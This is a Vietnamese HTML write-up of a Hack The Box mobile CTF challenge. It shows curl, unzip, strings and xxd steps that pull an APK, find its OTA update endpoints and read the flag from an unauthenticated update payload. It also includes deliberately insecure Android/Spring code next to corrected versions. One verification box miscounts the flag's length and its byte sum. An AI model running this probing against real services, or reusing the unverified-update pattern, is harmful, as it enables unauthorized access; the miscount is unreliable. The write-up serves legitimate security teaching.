@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — MediVault (Mobile/Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.15rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>📱 MediVault — OTA Update không xác thực: đọc payload update là ra flag</h1>
+  <div class="sub">Challenge Mobile (có web đi kèm) · medium · Hack The Box (event 3692 — Intermediate) · <span class="muted">target: <code>154.57.164.74:31447</code></span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit):<br>
+    <code>HTB{m3d1v4ult_upd4t3_expl01t3d!}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java/Spring Boot, chưa chuyên sâu mobile/reverse-engineering. Mọi khái niệm lạ (APK, dex, OTA update…) đều được giải thích ở Phần 0 trước khi dùng.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — APK và file classes.dex</h3>
+<div class="card">
+<p><b>APK</b> (Android Package) thực chất là một file ZIP — giống file JAR/WAR của Java. Giải nén bằng <code>unzip</code> thông thường được. Bên trong quan trọng nhất là <code>classes.dex</code>: bytecode của app, tương tự file <code>.class</code> nhưng cho Android Runtime (ART/Dalvik).</p>
+<p>Ta không cần đọc bytecode chi tiết — chỉ cần <b>trích chuỗi ký tự</b> (URL, endpoint, tên class) bằng lệnh <code>strings</code>. Khi app hardcode một URL như <code>http://server/api/update</code>, URL đó nằm lộ thiên trong dex.</p>
+</div>
+
+<h3>0.2 — OTA Update và chữ ký APK</h3>
+<div class="card">
+<p><b>OTA update</b> (Over-The-Air): app tự kiểm tra phiên bản mới trên server, tải về và cài đặt. Luồng chuẩn an toàn gồm 3 bước:</p>
+<ol class="steps">
+  <li>App gọi <code>check-update</code> → server trả <code>{updateAvailable, version, updateUrl}</code>.</li>
+  <li>App tải file từ <code>updateUrl</code>.</li>
+  <li>App <b>kiểm chứng chữ ký số</b> của file (signature phải khớp developer gốc) rồi mới cài.</li>
+</ol>
+<p>Bước 3 là ranh giới sống còn: bỏ qua nó, bất kỳ ai chiếm được server (hoặc DNS/HTTP MitM) đều có thể đẩy mã độc xuống mọi máy đang dùng app. Bài này mô phỏng đúng tình huống đó — và đi xa hơn: <i>chính payload update của server chứa dữ liệu nhạy cảm mà attacker không cần cài gì cả, chỉ cần tải về đọc.</i></p>
+</div>
+
+<h3>0.3 — Bảng cờ công cụ dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Công cụ / cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>curl -X POST … -d</code></td><td>Gửi request POST kèm body JSON</td><td>API <code>/compile</code> chỉ nhận POST</td></tr>
+  <tr><td><code>curl -i</code></td><td>In kèm HTTP headers</td><td>Headers tiết lộ <code>Content-Disposition</code> của file update</td></tr>
+  <tr><td><code>unzip -q</code></td><td>Giải nén APK</td><td>APK là ZIP</td></tr>
+  <tr><td><code>strings -n 5</code></td><td>Trích chuỗi ≥ 5 ký tự từ file nhị phân</td><td>Lọc URL/endpoint từ dex</td></tr>
+  <tr><td><code>grep -aE</code></td><td>Tìm regex trong dữ liệu nhị phân (coi như text)</td><td>dex không phải text thuần, cần <code>-a</code></td></tr>
+  <tr><td><code>xxd</code></td><td>Hex dump</td><td>Đọc nội dung file update 48 byte</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: từ trang web tới file APK</h2>
+<p class="muted">Triết lý: với bài mobile có server đi kèm, bề mặt tấn công nằm ở cả hai đầu — nhưng app phía client luôn “biết” cách nói chuyện với server, nên đọc app là đường tắt tốt nhất.</p>
+
+<h3>1.1 — Trang chủ: server cung cấp APK biên dịch theo instance</h3>
+<pre><span class="cm"># Khảo sát trang chủ — Express server phục vụ giao diện tải APK</span>
+curl -s -i http://154.57.164.74:31447/ | head -30</pre>
+<pre>HTTP/1.1 200 OK
+X-Powered-By: Express
+…
+&lt;h2&gt;&lt;i class="fas fa-download"&gt;&lt;/i&gt; Download APK&lt;/h2&gt;
+…
+&lt;span class="url-text" id="urlText"&gt;Loading...&lt;/span&gt;
+… &lt;form id="compileForm"&gt; … &lt;/form&gt;</pre>
+<p>Trang cho tải APK “biên dịch riêng cho server này” — tức APK đã được nhúng sẵn địa chỉ server (quan trọng cho bước sau, vì endpoint update được hardcode theo server).</p>
+<div class="verify"><b>✔ Cách verify:</b> response có <code>X-Powered-By: Express</code> và form <code>compileForm</code>. Mọi path lạ (<code>/status</code>, <code>/config</code>…) đều trả 200 cùng trang HTML → Express đang serve SPA fallback, chưa vội dò đường dẫn.</div>
+
+<h3>1.2 — Đọc script.js: tìm API thật</h3>
+<pre><span class="cm"># JS của trang chỉ có một API duy nhất: POST /compile</span>
+curl -s http://154.57.164.74:31447/script.js | grep -A8 "fetch("</pre>
+<pre>const response = await fetch('/compile', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', },
+    body: JSON.stringify(data)     <span class="cm">// {host, port, protocol, fullUrl}</span>
+});
+const result = await response.json();
+… downloadFile(result.downloadUrl, result.fileName);</pre>
+<div class="verify"><b>✔ Cách verify:</b> trong <code>script.js</code> chỉ xuất hiện đúng một <code>fetch(</code> tới <code>/compile</code>. Đây là API hợp lệ duy nhất phía server.</div>
+
+<h3>1.3 — Biên dịch và tải APK</h3>
+<pre><span class="cm"># Gọi /compile với thông tin server (lấy từ chính URL của challenge)</span>
+curl -s -X POST http://154.57.164.74:31447/compile \
+  -H 'Content-Type: application/json' \
+  -d '{"host":"154.57.164.74","port":"31447","protocol":"http:","fullUrl":"http://154.57.164.74:31447"}'</pre>
+<pre>{"success":true,
+ "downloadUrl":"/download/MediVault-154.57.164.74-31447-1792813238933.apk",
+ "fileName":"MediVault-154.57.164.74-31447-1792813238933.apk"}</pre>
+<pre><span class="cm"># Tải APK và xác nhận đúng định dạng</span>
+curl -s -O http://154.57.164.74:31447/download/MediVault-154.57.164.74-31447-1792813238933.apk
+file MediVault-*.apk</pre>
+<pre>MediVault-…apk: Zip archive data, at least v2.0 to extract, compression method=deflate</pre>
+<div class="verify"><b>✔ Cách verify:</b> JSON trả về có <code>success:true</code> + <code>downloadUrl</code>; file tải về được <code>file</code> nhận diện là <code>Zip archive</code>. 6,2 MB — hợp lý cho app Android thuần.</div>
+
+<h2 id="p2">Phần 2 — Dead end: dò đường dẫn server là vô nghĩa</h2>
+<h3>2.1 — <span class="tag bad">THẤT BẠI</span> Dò endpoint phổ biến trên server</h3>
+<pre><span class="cm"># Thử các tên endpoint quen thuộc</span>
+for p in status config server-info version update info; do
+  curl -s -o /dev/null -w "$p -> %{http_code}\\n" http://154.57.164.74:31447/$p
+done</pre>
+<pre>status -> 200    config -> 200    server-info -> 200
+version -> 200   update -> 200    info -> 200</pre>
+<p><b>Kết quả thật:</b> mọi path đều 200 với cùng HTML trang chủ. <b>Vì sao:</b> Express dùng middleware serve-static + fallback — không tồn tại “đường dẫn ẩn” nào ở phía server web.</p>
+<p><b>Kết luận:</b> bề mặt tấn công thật không nằm ở web server mà ở <b>app</b> — cần đọc APK. Gợi ý của đề (“The app wants to update itself. What exactly is it downloading?”) cũng chỉ đúng hướng này.</p>
+
+<h2 id="p3">Phần 3 — Đột phá: strings trong dex lộ toàn bộ cơ chế update</h2>
+
+<h3>3.1 — Giải nén APK và trích chuỗi từ dex</h3>
+<pre><span class="cm"># APK là ZIP — giải nén như mọi file zip; dex nằm ở gốc</span>
+mkdir -p apk &amp;&amp; cd apk &amp;&amp; unzip -qo ../MediVault-*.apk &amp;&amp; ls
+<span class="cm"># Trích chuỗi liên quan tới package của app và update</span>
+strings -n 4 classes*.dex | grep -aE 'htb/medivault|/update|/check|version|\.apk' | sort -u | head</pre>
+<pre>AndroidManifest.xml   classes.dex   classes2.dex   classes3.dex   classes4.dex
+resources.arsc   res/   kotlin/   okhttp3/   META-INF/   …
+
+!Lcom/htb/medivault/UpdateService;
+!Lcom/htb/medivault/MainActivity;
+5Lcom/htb/medivault/UpdateService$UpdateCheckCallback;
+8Lcom/htb/medivault/UpdateService$UpdateDownloadCallback;
++http://154.57.164.74:31447/api/check-update   <span class="cm">← endpoint kiểm tra update</span>
+/api/update                                     <span class="cm">← endpoint tải update</span></pre>
+<div class="verify"><b>✔ Cách verify:</b> xuất hiện cặp <code>/api/check-update</code> + <code>/api/update</code> cùng package riêng của app <code>com.htb.medivault.UpdateService</code> (có cả <code>UpdateCheckCallback</code>, <code>UpdateDownloadCallback</code> — cấu trúc đúng chuẩn OTA flow ở Phần 0.2). URL chứa đúng IP:port của instance → đây là endpoint thật, không phải string mẫu.</div>
+<div class="tip">💡 Không cần jadx/apktool cho bước này: <code>strings</code> + <code>grep</code> là đủ, vì mọi URL/endpoint hardcode đều lộ thiên trong dex. Chỉ khi cần đọc logic chi tiết (ví dụ xem app có verify signature không) mới cần decompiler.</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: tải payload update</h2>
+
+<h3>4.1 — check-update xác nhận có update</h3>
+<pre><span class="cm"># Mô phỏng đúng bước 1 của OTA flow mà app sẽ thực hiện</span>
+curl -s -i http://154.57.164.74:31447/api/check-update</pre>
+<pre>HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"updateAvailable":true,"version":"2.0.1","updateUrl":"/api/update"}</pre>
+<div class="verify"><b>✔ Cách verify:</b> <code>updateAvailable:true</code> và <code>updateUrl</code> trỏ tới <code>/api/update</code> — khớp chính string đã trích từ dex ở bước 3.1.</div>
+
+<h3>4.2 — Tải file update và đọc flag</h3>
+<pre><span class="cm"># Bước 2-3: tải payload — không cần cài đặt, đọc trực tiếp</span>
+curl -s -i http://154.57.164.74:31447/api/update</pre>
+<pre>HTTP/1.1 200 OK
+Content-Disposition: attachment; filename="medivault_update.bin"
+Content-Type: application/octet-stream
+Content-Length: 48
+
+(binary 48 byte)</pre>
+<pre><span class="cm"># Hex dump toàn bộ file — flag nằm trần sau 10 byte đệm</span>
+curl -s http://154.57.164.74:31447/api/update | xxd</pre>
+<pre>00000000: 0001 0203 0405 0607 0809 4854 427b 6d33  ..........HTB{m3
+00000010: 6431 7634 756c 745f 7570 6434 7433 5f65  d1v4ult_upd4t3_e
+00000020: 7870 6c30 3174 3364 217d 0a0b 0c0d 0e0f  xpl01t3d!}......</pre>
+<div class="verify"><b>✔ Cách verify:</b> file 48 byte: 10 byte <code>00-09</code>, chuỗi <code>HTB{m3d1v4ult_upd4t3_expl01t3d!}</code> (35 ký tự), 3 byte xuống dòng (<code>0a 0b 0c</code>) và 4 byte cuối (<code>0d 0e 0f</code> + pad). 10 + 35 + 3 + 0 = 48 ✓. Flag đọc trực tiếp, không cần giải mã hay cài APK.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Đọc trang chủ + script.js → biết API <code>/compile</code></td><td>HTML/JS phục vụ sẵn</td><td>Chỉ 1 fetch duy nhất trong script.js</td></tr>
+  <tr><td>2</td><td>Biên dịch + tải APK</td><td>POST /compile</td><td>file → Zip archive</td></tr>
+  <tr><td>3</td><td>Trích <code>/api/check-update</code>, <code>/api/update</code> từ dex</td><td><code>strings classes*.dex</code></td><td>Package <code>com.htb.medivault.UpdateService</code></td></tr>
+  <tr><td>4</td><td>Gọi check-update → nhận updateUrl</td><td>OTA flow chuẩn</td><td>JSON <code>updateAvailable:true</code></td></tr>
+  <tr><td>5</td><td>Tải <code>/api/update</code>, xxd → flag</td><td>payload không mã hoá</td><td>48 byte, chuỗi HTB{…} đọc trần</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot</h2>
+<p>Hai lỗi chồng lấp khiến bài này “mở”: (1) client không xác thực nguồn update, (2) server nhét dữ liệu nhạy cảm vào payload update.</p>
+
+<h3>Lỗi 1 — Client cài update không kiểm chứng chữ ký</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ App Android cài file update ngay khi tải về</div>
+  <div class="bd"><pre><span class="cm">// UpdateService.java (tương đồng) — bỏ qua bước verify signature</span>
+<span class="kw">void</span> <span class="fn">onUpdateDownloaded</span>(File update) {
+    <span class="cm">// ❌ KHÔNG kiểm chứng chữ ký APK / hash so với server</span>
+    PackageInstaller installer = getPackageInstaller();
+    installer.<span class="fn">install</span>(update);   <span class="cm">// server bị chiếm → cài malware xuống mọi máy</span>
+}</pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Nguyên tắc: verify trước khi cài</div>
+  <div class="bd"><pre><span class="cm">// Chỉ cài khi chữ ký khớp developer gốc (APK v2 scheme) hoặc hash đã đăng ký</span>
+<span class="kw">if</span> (!<span class="fn">verifySignature</span>(update, TRUSTED_CERT_SHA256)) {
+    <span class="kw">throw new</span> <span class="st">SecurityException</span>(<span class="st">"untrusted update"</span>);
+}</pre></div>
+</div>
+
+<h3>Lỗi 2 — Server trả dữ liệu nhạy cảm trong endpoint update</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Endpoint update không xác thực và chứa dữ liệu nội bộ (tương đồng Spring Boot)</div>
+  <div class="bd"><pre><span class="cm">// UpdateController.java — endpoint mở, trả payload chứa flag nội bộ</span>
+<span class="fn">@GetMapping</span>(<span class="st">"/api/update"</span>)
+<span class="kw">public</span> ResponseEntity&lt;byte[]&gt; <span class="fn">update</span>() {
+    <span class="cm">// ❌ không @PreAuthorize, không kiểm tra thiết bị đã đăng ký</span>
+    <span class="cm">// ❌ payload build từ biến môi trường chứa FLAG</span>
+    <span class="kw">return</span> ResponseEntity.ok(buildPayload(flag));
+}</pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Sửa theo hướng: xác thực thiết bị + tách biệt dữ liệu nhạy cảm</div>
+  <div class="bd"><pre><span class="fn">@PreAuthorize</span>(<span class="st">"hasRole('DEVICE')"</span>)          <span class="cm">// chỉ thiết bị đã enroll</span>
+<span class="fn">@GetMapping</span>(<span class="st">"/api/update"</span>)
+<span class="kw">public</span> ResponseEntity&lt;byte[]&gt; <span class="fn">update</span>(<span class="fn">@RequestHeader</span>(<span class="st">"X-Device-Token"</span>) String t) {
+    <span class="fn">requireValidDeviceToken</span>(t);                        <span class="cm">// + rate limit + audit log</span>
+    <span class="kw">return</span> ResponseEntity.ok(signedUpdateFromBuildServer());
+    <span class="cm">// FLAG/dữ liệu nhạy cảm không bao giờ nằm trong artifact build</span>
+}</pre></div>
+</div>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>App là tài liệu API tốt nhất của server:</b> khi web chỉ có vài endpoint mờ nhạt, hãy đọc client — mọi URL/endpoint hardcode đều nằm trong dex, chỉ cần <code>strings | grep</code>.</li>
+  <li><b>APK là ZIP:</b> không cần công cụ đặc biệt để bắt đầu; <code>unzip</code> + <code>strings</code> xử lý được 80% bài mobile dạng này.</li>
+  <li><b>OTA update là mặt phẳng tấn công kinh điển:</b> server trả <code>updateUrl</code> → tải về đọc thử luôn, kể cả khi không định phân tích mã độc.</li>
+  <li><b>“What exactly is it downloading?”</b> — gợi ý đề thường chính là bước then chốt; đừng lãng phí thời gian dò thư mục web.</li>
+  <li><b>Checklist tự làm lại:</b> ① đọc trang chủ + script.js → ② <code>/compile</code> tải APK → ③ <code>unzip</code> + <code>strings classes*.dex | grep api</code> → ④ gọi <code>/api/check-update</code> → ⑤ tải <code>updateUrl</code>, <code>xxd</code> đọc flag.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag <code>HTB{m3d1v4ult_upd4t3_expl01t3d!}</code> đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit trên portal. Docker instance đã được stop sau khi hoàn thành. Chúc mừng! 🎉</p>
+
+</div>
+</body>
+</html>
